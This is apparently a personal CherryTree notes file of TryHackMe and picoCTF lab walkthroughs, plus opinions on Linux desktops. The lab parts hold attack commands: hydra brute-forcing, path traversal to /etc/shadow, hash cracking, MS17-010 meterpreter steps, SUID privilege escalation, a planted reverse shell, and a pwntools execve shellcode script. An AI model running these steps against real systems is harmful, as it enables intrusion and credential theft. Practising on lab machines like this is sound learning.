~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-rwsr-xr-x 1 igor igor 2770528 Mar 31  2016 /usr/bin/nmap
-rwsr-xr-x 1 igor igor 221768 Feb  7  2016 /usr/bin/find
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="9" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587681689.42" ts_lastsave="1587681694.12" unique_id="453">
					<rich_text>couldnt do day 9</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="10" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587378885.03" ts_lastsave="1587672701.33" unique_id="390">
					<rich_text>metasploit!!
10.10.109.88
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
everything that is under root redirects back
/struts/add is not under root so it doesnt redirect for example.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
scan with nikto says the website is vulnerable to strutshock
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
santa:rudolphrednosedreindeer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
were in a docker container, ssh connects outside the container iiuc, so i might need to try privesc with linenum
no need using find &amp; grep to find a key on the reverse shell was enough</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="~~~~~~~~~~~~" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587672701.54" ts_lastsave="1587683729.04" unique_id="448">
					<rich_text>buraya kadar notlar deftere islendi
+day 9 i oku</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="11" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587487625.64" ts_lastsave="1587602538.99" unique_id="429">
					<rich_text>10.10.11.57
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ftp is open
ftp has uploads&amp;pub dir, both empty
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CREDS
</rich_text>
					<rich_text link="webs ftp://anonymous:anonymous">ftp://anonymous:anonymous</rich_text>
					<rich_text>
mysql:root:ff912ABD*
EXTRACTED FROM SQL-&gt; admin:bestpassword
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
mysql -u root -p --host IP
mysqldump -A -u root -password=ff912ABD* --host 10.10.11.57 &gt; export_into_db.sql
local: sudo service mysql start 
local: sudo -i
local: /usr/bin/mysql -u root -p    #def pw is &lt;empty&gt;.
local: source /home/thmyris/sec/thm/adventofcyber/11/export_into_db.sql
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
now i have the db dump locally &amp; can create the individual .db files (didnt really need this lmao)
downloaded crgrep in hopes of using it but i need to create .db file which im too lazy to pursue
i CANT find how to make multiple databases from one .sql file
ill just manually search for a pw -_-
f.me its in data 1 fucking line
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Network File System (NFS): Network File System allows remote hosts to mount the systems/ directories over a network. 
</rich_text>
					<rich_text scale="h3">Typical implementation</rich_text>
					<rich_text>
1. The server implements NFS </rich_text>
					<rich_text link="webs https://en.wikipedia.org/wiki/Daemon_(computer_software)">daemon</rich_text>
					<rich_text> processes, running by default as </rich_text>
					<rich_text family="monospace">nfsd</rich_text>
					<rich_text>, to make its data generically available to clients.
2. The server administrator determines what to make available, exporting the names and parameters of </rich_text>
					<rich_text link="webs https://en.wikipedia.org/wiki/Directory_(file_systems)">directories</rich_text>
					<rich_text>, typically using the </rich_text>
					<rich_text family="monospace">/etc/exports</rich_text>
					<rich_text> configuration file and the </rich_text>
					<rich_text family="monospace">exportfs</rich_text>
					<rich_text> command.
3. The server </rich_text>
					<rich_text link="webs https://en.wikipedia.org/wiki/Network_security">security</rich_text>
					<rich_text>-administration ensures that it can recognize and approve validated clients.
4. The server network configuration ensures that appropriate clients can negotiate with it through any </rich_text>
					<rich_text link="webs https://en.wikipedia.org/wiki/Firewall_(networking)">firewall</rich_text>
					<rich_text> system.
5. The client machine requests access to exported data, typically by issuing a </rich_text>
					<rich_text family="monospace">mount</rich_text>
					<rich_text> command. (The client asks the server (rpcbind) which port the NFS server is using, the client connects to the NFS server (nfsd), nfsd passes the request to mountd)
6. If all goes well, users on the client machine can then view and interact with mounted </rich_text>
					<rich_text link="webs https://en.wikipedia.org/wiki/Filesystem">filesystems</rich_text>
					<rich_text> on the server within the parameters permitted.
showmount -e 192.168.100.25 #show &quot;shares&quot;
mkdir /tmp/pentest
sudo mount -t nfs 10.10.11.57:/opt/files /tmp/pentest
cd /tmp/pentest
ls -la
#files are owned by me with 777 permissions
cat creds.txt
im done with this shit box

</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="12" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587644784.19" ts_lastsave="1587672864.64" unique_id="368">
					<rich_text>RSA private/public key generation:
To generate a private key we use the following command (8912 creates the key 8912 bits long):
openssl genrsa -aes256 -out private.key 8912

To generate a public key we use our previously generated private key:
openssl rsa -in private.key -pubout -out public.key
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Encryption/Decryption
Lets now encrypt a file (plaintext.txt) using our public key:
openssl rsautl -encrypt -pubin -inkey public.key -in plaintext.txt -out encrypted.txt

Now, if we use our private key, we can decrypt the file and get the original message:
openssl rsautl -decrypt -inkey private.key -in encrypted.txt -out plaintext.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
since john and hashcat isnt able to crack passwords of private rsa keys (right now), I used a custom python script I got from </rich_text>
					<rich_text link="webs https://asecuritysite.com/subjects/chapter105">https://asecuritysite.com/subjects/chapter105</rich_text>
					<rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
damn man i had to convert rockyou to utf8 or the cracking script cant parse the file, what a nightmare.
iconv -f ISO-8859-1 -t UTF-8 /pentest/passwords/wordlists/rockyou.txt &gt; rockyou_utf8.txt
check if successful:
</rich_text>
					<rich_text family="monospace">vi -c 'let $enc = &amp;fileencoding | execute &quot;!echo Encoding:  $enc&quot; | q' rockyou_utf8.txt </rich_text>
					<rich_text>
OR
cat /opt/file | grep -n -P &quot;[\x80-\xFF]&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ran the script got the flag!</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="13" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587672864.85" ts_lastsave="1587729328.38" unique_id="449">
					<rich_text>looks like a tough nut to crack!
10.10.201.5
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
randomly clicking around on the site redirected to this info:
</rich_text>
					<rich_text background="#043e54">Internet Information Services (IIS) for Windows® Server</rich_text>
					<rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
the ip cannot be pinged so it probably has firewall, hence windows
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
added -Pn to nmap and ran anyway
nmap: IIS 10.0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
gobuster time
/retro
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
wade's comment:
Leaving myself a note here just in case I forget how to spell it: parzival
yoooo, the /retro's wordpress login:
wade:parzival
what the hell can i do with a wordpress login besides trashing the site?
WordPress 5.2.1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Remote Desktop (TCP Port 3389)
Allow remote assistance connections to this computer ayarini gorup de untickledigin sey var ya heh o remote desktop bu. Port acik olunca cillop gibi calisiyor. RDP (..protocol) diye de biliniyor.
xfreerdp /u:&quot;wade&quot; /p:parzival /v:10.10.201.5
DUDE I GOT REMOTE DESKTOP WTFFF, ITS SO CLEAN LOOKING AND ALL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CHAPTER 10: GOING THROUGH EVERYTHING
1. there was a setup in trash: hhupd.exe | HTML Help ActiveX Control
2. uac needs administrator pw, the guy isnt admin on his own machine FailFish
3. Windows Server 2016 Standard 1607, OS Build: 14393.0, 
4. chrome has a bookmark: </rich_text>
					<rich_text link="webs https://nvd.nist.gov/vuln/detail/CVE-2019-1388">https://nvd.nist.gov/vuln/detail/CVE-2019-1388</rich_text>
					<rich_text>
5. chrome had ton of history but they disappeared :(
6. MySql is installed v6.9?
7. Ethernet is connected via AWS PV Network Device

Running Processes:
amazon-ssm-agent
mysqld
rdpclip
aws Lite Guest Agent (xenagent)
smbsvcs

how to do the cve: </rich_text>
					<rich_text link="webs https://youtu.be/3BQKpPNlTSo">https://youtu.be/3BQKpPNlTSo</rich_text>
					<rich_text>
dont forget to set internet explorer as the default browser for this to work



















</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="15" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587729328.59" ts_lastsave="1587734987.63" unique_id="456">
					<rich_text>10.10.74.105
LFI
looking at the source, we can see there is a &quot;function getNote(note, id)&quot;
lets examine what it does
it defines a url
that starts with &quot;/get-file/&quot;
then adds the &quot;note&quot; var which we can see the structure of from the call of function below the function
getNote('views/notes/note1.txt', '#note-1')
so its something like
/get-file/views/notes/note1.txt
but it also seems to url encode along the way.
so something like
/get-file/views%2Fnotes%2Fnote1.txt
I have no idea what the next 2 lines do but lets try this

Calling note3 that way we got this:
{&quot;success&quot;:true,&quot;info&quot;:&quot;To do list:\n\n[-] Take Santa sleigh in for an MOT\n[-] Improve security on file inclusion\n[-] Go food shopping\n[-] Book holiday to Hawaii\n&quot;}

So lets try to call server.js:
{&quot;success&quot;:true,&quot;info&quot;:&quot;const express = require('express')\nconst path = require('path')\nconst app = express()\nconst fs = require('fs')\nconst port = 80\n\napp.set('view engine', 'ejs')\napp.use('/', express.static(path.join(__dirname + '/views')))\napp.listen(port, () =&gt; console.log(`Example app listening on port ${port}!`))\n\napp.get('/', function(req, res) {\n  res.render('index.ejs')\n})\n\napp.get('/get-file/:location', async function(req, res) {\n  const data = await fs.readFileSync(req.params.location, 'utf8')\n  res.json({success: true, info: data})\n})\n&quot;}

This looks the back end of our /get-file/.
Moving on.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Tried </rich_text>
					<rich_text link="webs http://10.10.74.105/get-file/etc%2Fshadow">http://10.10.74.105/get-file/etc%2Fshadow</rich_text>
					<rich_text> , the website got locked up in a busy loop
so maybe if we curl? No response.
index.js also locks it up. At this point I'm worried something crashed in the background so I call server.js again, it works.
No luck in common lfi points
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Maybe if I gobuster /get-file/?
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u 10.10.74.105/get-file/ --wildcard | tee gobuster.log
No luck.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
We can directory treverse to the root by putting a bunch of ../../ in the url. The more you put, the better chance ur at root. No problem even if you put too much.
So
</rich_text>
					<rich_text link="webs http://10.10.74.105/get-file/..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow">http://10.10.74.105/get-file/..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow</rich_text>
					<rich_text>
we have read:
charlie:$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:18243:0:99999:7:::
Found it in hashcat:
MODE: 1800                                   
TYPE: sha512crypt $6$, SHA512 (Unix)         
HASH: $6$72820166$U4DVzpcYxgw7MVVDGGvB2/H5lRistD5.Ah4upwENR5UtffLR4X4SxSzfREv8z6wVl0jRFX40/KnYVvK4829kD1
PASS: hashcat
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hashcat -m 1800 tocrack --force
#ofc my pc says illegal instruction then i use sis' pc
$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:password1
charlie:password1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
now we can ssh









</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="17" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587683896.6" ts_lastsave="1587725675.42" unique_id="454">
					<rich_text>10.10.2.254
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
molly:joyness1994
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hydra -I -l molly -P /opt/rockyou.txt 10.10.2.254 http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:F=incorrect&quot; -vV
the password is in the rockyou.txt but the website hint is trolling saying its in the first 30. According to other writeups it may have been in the top 30 in the past, but its now in the 900k area which would take a week for my pc&amp;network to reach. FU whoever did that.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh:
hydra -l molly -P /opt/rockyou.txt -vV ssh://10.10.2.254
molly:butterfly
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="after ur done" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587644787.99" ts_lastsave="1587644792.38" unique_id="443">
					<rich_text>go back and read all the pdfs you downloaded, there was some you couldnt download because they were blogs
</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="zthlinux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586885623.4" ts_lastsave="1587637692.4" unique_id="345">
				<rich_text>there might be a nootnoot user
flag is in /root/root.txt

X is not a sudoer

shiba1:shiba1:X
shiba2:pinguftw:X
shiba3:happynootnoises:X
shiba4:test1234:X
noot:
nootnoot:

run sudo -l for every user
no sudoer.
run this for every user:
find / -user shiba1 -type f 2&gt;&gt;/dev/null | grep -v proc
file owned by shiba2 in /var/log/test1234 displays:
nootnoot:notsofast
nootnoot is a big sudoer.
sudo -i to become root

</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="/etc/passwd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586890867.85" ts_lastsave="1586890868.94" unique_id="351">
					<rich_text>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
nootnoot:x:1000:1000:nootnoot:/home/nootnoot:/bin/bash
shiba1:x:1001:1001:,,,:/home/shiba1:/bin/bash
shiba2:x:1002:1002:,,,,ls:/home/shiba2:/bin/bash
shiba3:x:1003:1003:,,,:/home/shiba3:/bin/bash
shiba4:x:1004:1004:,,,:/home/shiba4:/bin/bash
noot:x:1005:1006:,,,:/home/noot:/bin/bash
</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Basic Pentesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586540195.48" ts_lastsave="1586726764.83" unique_id="288">
				<rich_text>10.10.123.174
ssh://jan@armando
kay@beeswax


j has weak password in /etc/passwd
smb has been set up by k with v2.5.12

enum4linux.log found:
1)
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

2)
[+] Retieved partial password policy with rpcclient: 
Password Complexity: Disabled
Minimum Password Length: 5 

3)
[+] Trying protocol 139/SMB... 
[+] Found domain(s):  [+] BASIC2 [+] Builtin

4) SMB share:
Anonymous </rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="rpnmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589599338.9" ts_lastsave="1591389265.95" unique_id="490">
				<rich_text></rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="vulnversity" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589694355.01" ts_lastsave="1589699210.63" unique_id="498">
				<rich_text>while intrudering extensions with sniper attack
the only thing that changed was the messages length
the raw message didnt change
the page status code didnt change, weird.
the different one was .phtml
DISCLAIMER: I was looking at the request not response LMAO
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="blue" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589752646.57" ts_lastsave="1589858841.14" unique_id="504">
				<rich_text>
get a shell with smb-vuln-ms17-010
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Windows 7 Professional 7601 Service Pack 1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
upgrade shell with
sessions -u 1
post/multi/manage/shell_to_meterpreter

task3, #4: 2356 powershell.exe

Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable.

ps zaten benim shellmis.

migrate 2168 ile cmdye gecitm
hashdump
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hashcat64.exe -O -m 1000 crackthis.hash rockyou.txt
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
Jon:alqfna22
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
tried to crack the others, i think admin has no pw, guest failed.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="anonymous" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589762986.39" ts_lastsave="1589823401.5" unique_id="526">
				<rich_text>10.10.218.184
~~~~~~~~~~~~~~~INFO~~~~~~~~~~~~~~~~~~
4ubuntu0.3
anon ftp open
clean.sh in ftp serv is writable+X
smb shares:
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
!!!
5dkda bir .log yenileniyor. Yani 5dkda 1 clean.sh calisiyor.
-rw-rw-r--    1 1000     1000          258 May 17 23:15 removed_files.log
-rw-rw-r--    1 1000     1000          301 May 17 23:20 removed_files.log
clean.sh e reverse shell koyabilirsem gg
!!!
Theres this line on nmap output
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 May 17 12:20 scripts [NSE: writeable]
writeable.
hmm
!!!
rootta pics folderi var, smb ile aynimi acaba?
ssh -&gt; PermitRootLogin yes
%99 privesc:
</rich_text>
				<rich_text link="file L3Vzci9iaW4vZW52">/usr/bin/env</rich_text>
				<rich_text>

~~~~~~~~~~~~~~CREDS~~~~~~~~~~~~~~~~~~~
ftp://anonymous:anonymous   #anon login

namelessone@anonymous:~$ 
~~~~~~~~~~~~~~~STEPS~~~~~~~~~~~~~~~~~~
ftp 10.10.68.50
anonymous:anonymous
im a pepega, ive been trying to 'get' a folder XD
smbclient -L 10.10.68.50
smbclient \\\\10.10.218.184\\pics
i just got in lol
clean.sh dosyasinin icine bash reverse shell yazdim
ftp ile anon login yapip, lcd ile local klasore gidip, cd ile remote klasore gidip, put komutunu kullandim
clean.sh i oraya yazdi.
namelessone@anonymous:~$ 
pics folderindaki resimleri yoinklicem
ran linpeas
/usr/bin/env has suid
./env /bin/sh -p
ROOT
ezpz

read writeups for this sometime next month
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="lazyadmin" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589823401.79" ts_lastsave="1589830034.25" unique_id="529">
				<rich_text>10.10.117.75
~~~~~~~~~~~~~~~STEPBYSTEP~~~~~~~~~~~~~~~~~~
website has nothin
/content -&gt; sweetrice
/content/as -&gt; sweetrice login

apache version:
exploits/php/remote/40142.php
exploits/linux/dos/34133.txt

sweetrice version maybe -&gt; +1.2.1 slash that -&gt; </rich_text>
				<rich_text background="#627e32" foreground="#e0e0e0">© 2020</rich_text>
				<rich_text>

smth here maybe: </rich_text>
				<rich_text link="webs http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/">http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/</rich_text>
				<rich_text>

SweetRice 1.5.1 - Arbitrary File Download                                | exploits/php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                  | exploits/php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                      | exploits/php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                             | exploits/php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution        | exploits/php/webapps/40700.html

the login page looks brute forceable

from the .sql file:
manager:42f749ade7f9e195bf475f37a44cafcb -&gt; doesnt work on /as
this pw is looks hashed, using hash-identifier reveals its either md5 or md4

cracked with -m 0 hashcat
manager:Password123
logged into /as

ssh creds arent the same.

since we logged in, sweetrice version is: </rich_text>
				<rich_text background="#520d6b">Current version : 1.5.1</rich_text>
				<rich_text>

searchsploit file upload and try to execute and ezpz
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="thecodcaper" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589919155.9" ts_lastsave="1591389324.33" unique_id="561">
				<rich_text>10.10.93.23
this box rekt me :S</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="th-picoCTF19" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579348103.78" ts_lastsave="1587637689.3" unique_id="154">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="handy-shellcode" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579348543.71" ts_lastsave="1579350119.5" unique_id="155">
				<rich_text weight="heavy">Objective:</rich_text>
				<rich_text foreground="#333333"> </rich_text>
				<rich_text foreground="#990000" weight="heavy">To create an Execve Shellcode[1] which can launch /bin/sh</rich_text>
				<rich_text>

Disclaimer: Of course we do all this inside the online shell picoCTF provides. Without it we would need to write a python code that would connec
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
t to the server with ssh. I don't have enough experience to comfortably do that right now but I'll paste that code below.[2]

we need to find a shellcode that keeps privileges (-p)
shell-storm has this: </rich_text>
				<rich_text link="webs http://shell-storm.org/shellcode/files/shellcode-606.php">http://shell-storm.org/shellcode/files/shellcode-606.php</rich_text>
				<rich_text>

Then we only need the hex part of the shellcode, because if we look at the source, vuln.c, it runs whatever shellcode it's given.

One way to feed our shellcode as payload into ‘vuln’ is to use 
python -c “print'HEXERE'” | ./vuln

But when we use this, the bash shell gets created, but since it doesn't have any input it breaks. How do we stop this from happening?

Well, cat has a weird functionality when it is given no arguments. It copies the stdinput to stdoutput. Since it is designed to print stdoutput, it will re-post anything you write to it.

We can interrupt the shell from closing by using cat and making the shell wait for an input. I don't really understand how the output is not again printed by ‘cat’ when you do this but hey, by doing this, we can input anything we want in real time to the shell.

just use:
( python -c “print'HEXHERE'” ; cat) | ./vuln

By spawning a shell inside the machine and remotely inputting it from your own screen you can now read flag.txt and get the flag.


[1]: What are shellcodes? Essentially they are the addresses of pre-set kernel opcodes. They are mostly executed via buffer-overflows. Opcodes are the gears of the OS engine. They make your code run. For example if you put ‘int 3;’ in your c code and run it, on intel machines it will trigger a breakpoint, all debuggers use this on intel machines.

[2]: #!/usr/bin/python

import os
import paramiko
import sys
from pwn import *
import warnings
warnings.filterwarnings(action='ignore',module='.*paramiko.*')
PADDING = 164
def connect_ssh():
    path = &quot;/problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405/&quot;
    payload =&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot;
    s = ssh(host='2019shell1.picoctf.com',user='',password='')
    py = s.run('cd '+path+';'+'./vuln')
    print py.recv()
    py.sendline(payload)
    py.sendline()
    py.interactive()
def main():
    connect_ssh()

main()</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="jh-picoCTF18" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1578932995.91" ts_lastsave="1586676425.99" unique_id="132">
			<rich_text>
</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="#0004ff" is_bold="True" name="Low Level Software" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586110653.81" ts_lastsave="1587736832.53" unique_id="178">
		<rich_text>
</rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Desktop Environment" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586110405.48" ts_lastsave="1586433971.54" unique_id="173">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Cinnamon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586110430.53" ts_lastsave="1586110432.71" unique_id="176">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Deepin" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586110432.75" ts_lastsave="1586110928.95" unique_id="177">
				<rich_text>Looks FUKIN gorgeous tbh
modern af
quite good customisation
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Gnome" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586110409.89" ts_lastsave="1586110596.91" unique_id="174">
				<rich_text>gnome 3 is the worst shit to have ever come to earth.
use whatever the fuc u want but not gnome 3
thank you and haveniceday
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="KDE" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586111066.25" ts_lastsave="1586435381.84" unique_id="187">
				<rich_text>looks quite decent
-low RAM</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Pantheon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586433971.62" ts_lastsave="1586434019.38" unique_id="269">
				<rich_text>elementaryOS's default DE
hands down the best looking DE out there
its deepin tier
mac like look</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Xfce" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586110426.04" ts_lastsave="1586435377.42" unique_id="175">
				<rich_text>-very good performance
-very good looking
-low RAM
-my love
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="docky" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586434266.04" ts_lastsave="1586434269.93" unique_id="270">
					<rich_text>mac style dock</rich_text>
				</node>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Distros" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586110669.77" ts_lastsave="1586435002.94" unique_id="179">
			<rich_text>This section wont include easily available information from distrowatch. It mostly includes “strong opinions&quot; on the distros I've used. </rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="antiX" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586435003.02" ts_lastsave="1586435003.55" unique_id="276">
				<rich_text>light distro like slax for older computers</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Arch Linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586110722.06" ts_lastsave="1586110788.04" unique_id="181">
				<rich_text>people say is best end quote
hard-mode
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Kali" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586110788.09" ts_lastsave="1586110793.59" unique_id="182">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="KDE Neon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586434844.44" ts_lastsave="1586434844.44" unique_id="275">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="LXDE" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586111095.59" ts_lastsave="1586111096.71" unique_id="188">
